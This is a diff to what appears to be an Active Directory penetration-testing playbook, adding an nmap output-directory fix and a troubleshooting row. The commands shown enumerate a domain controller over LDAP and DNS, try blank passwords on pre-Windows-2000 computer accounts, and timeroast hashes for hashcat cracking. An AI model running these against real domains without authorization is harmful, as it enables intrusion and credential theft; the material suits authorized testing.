@@ -31,11 +31,14 @@ ldeep ldap -u {{USER}} -p '{{PASS}}' -d {{DOMAIN}} -s ldap://{{DC}} all /logs/en
 ldapdomaindump -u '{{DOMAIN}}\\{{USER}}' -p '{{PASS}}' {{DC}} -o /logs/enum/ldd
 
 dig axfr {{DOMAIN}} @{{NS}}
-nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 {{DC}}
+# nmap — mkdir the -oN dir first or the scan aborts silently
+mkdir -p /logs/nmap
+nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 {{DC}} \
+  -oA /logs/nmap/recon
 
 # pre2k computer accounts (blank password)
 nxc smb {{DC}} -u computers.txt -p '' --no-bruteforce --continue-on-success
-# timeroast (no cred)
+# timeroast (no cred) — current nxc dropped --timeroasting; skip if unrecognized
 nxc smb {{DC}} --timeroasting /logs/hashes/timeroast.txt
 # hashcat -m 31300 timeroast.txt
 
@@ -85,6 +88,7 @@ straight into `GetNPUsers` / `GetUserSPNs`.
 | lookupsid `ERROR_ACCESS_DENIED` | need any valid bind. AS-REP with an empty user list will fail too |
 | ldapsearch sizeLimit | `-E pr=1000/noprompt` or ldeep |
 | no 88/389 on the IP | that is a member. keep sweeping |
+| nmap writes 0 bytes / exits immediately | `-oN`/`-oA` dir missing — `mkdir -p` the parent first (MCP auto-mkdirs on detach) |
 | AXFR refused | normal. ignore |
 
 ## Chain
